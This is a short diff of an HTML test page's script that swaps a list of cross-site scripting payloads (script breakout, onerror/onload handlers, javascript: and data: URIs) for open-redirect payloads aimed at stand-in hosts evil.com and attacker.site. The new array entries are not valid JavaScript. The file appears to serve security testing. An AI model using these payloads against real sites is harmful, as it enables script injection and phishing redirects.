@@ -11,15 +11,10 @@
 
     <script>
       const payloads = [
-  `</script><script>alert('XSS1')</script>`,
-  `javascript:alert(document.domain)`,
-  `" onerror="alert('XSS2')`,
-  `<img src=x onerror=alert('XSS3')>`,
-  `data:text/html,<script>alert('XSS4')</script>`,
-  `<svg onload=alert('XSS5')>`,
-  `<iframe src="javascript:alert('XSS6')"></iframe>`,
-  `https://evil.com`,
-  `tg://resolve?domain=wallet`
+x=https://evil.com
+x=//evil.com
+x=javascript:window.location='https://attacker.site'
+x=data:text/html,<script>location='https://attacker.site'</script>
       ];
 
       let index = 0;
